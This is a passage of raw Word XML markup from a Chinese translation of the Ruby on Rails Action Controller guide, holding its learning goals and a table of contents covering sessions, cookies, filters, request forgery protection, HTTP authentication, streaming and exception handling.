            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>sample application</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3523EDA5" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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James Golick’s </w:t>
      </w:r>
      <w:hyperlink r:id="rId320" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>attribute_fu</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> plugin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E609388" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A0891EA" w14:textId="35088926" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="002725A5">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>控制器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D278C0" w14:textId="593B8D19" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>4.1、</w:t>
      </w:r>
      <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>动作控制器概述</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066F472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本指南中你将学到控制器的工作原理以及它们在你的应用的请求周期中是怎样协调运行的。阅读本指南后，你将能够：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760A52A0" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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跟踪通过控制器的请求的流向</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0510B6B2" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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理解为什么及如何在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中存储数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3D73CC" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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在请求处理中使用过滤器执行代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69904E98" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>动作控制器内建的 HTTP 验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6024163A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>直接流式</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>发送数据到用户的浏览器中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63759652" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>过滤敏感参数</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，使其不会出现在应用的日志中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3114AD2B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>处理</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>在请求处理中抛出的</w:t>
      </w:r>
      <w:r w:rsidRPr="00FE3010">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>异常</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01441B40" w14:textId="1716E83B"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目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD60473"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21" w:anchor="1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>控制器都做什么？</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="29756AF9"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22" w:anchor="2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>方法与动作</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1895A478"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23" w:anchor="3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FD34ECC"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24" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>哈希与数组参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2882B6F9"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25" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>JSON/XML 参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="39B23BEF"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26" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>路由参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05B212A0"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27" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>default_url_options</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B812C97"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28" w:anchor="4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Session</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="459853A1"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29" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>存取 Session</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7FCD18DB"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30" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>闪存</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7A3F93CC"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31" w:anchor="5" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Cookies</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7415FE41"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32" w:anchor="6" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>渲染 xml 和 json 数据</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AC7FB47"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33" w:anchor="7" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>过滤器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34FF896B"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34" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>后过滤器与前后过滤器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A47914E"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35" w:anchor="7-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用过滤器的其他方式</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="369E4975"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36" w:anchor="8" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>请求伪造保护</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7174EB76"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37" w:anchor="9" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>请求与响应对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D7A0587"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38" w:anchor="9-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>request</w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3D32E908"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39" w:anchor="9-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>response</w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 对象</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="65229B57"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40" w:anchor="10" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTTP 验证</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7BAE44B9"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41" w:anchor="10-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTTP 基本验证</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="678F7187"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42" w:anchor="10-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>HTTP 摘要验证</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05033FDB"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43" w:anchor="11" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>流与文件下载</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68B5790A"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44" w:anchor="11-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>发送文件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14F17596"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45" w:anchor="11-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RESTful 下载</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E38C620"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46" w:anchor="12" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>参数过滤</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="331569CE"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47" w:anchor="13" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>异常处理</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5788D5CE"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48" w:anchor="13-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>默认 500 和 404 模版</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="377F3519" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId349" w:anchor="13-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>rescue_from</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2624E430" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId350" w:anchor="14" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>强制 HTTPS 协议</w:t>
        </w:r>
      </w:hyperlink>
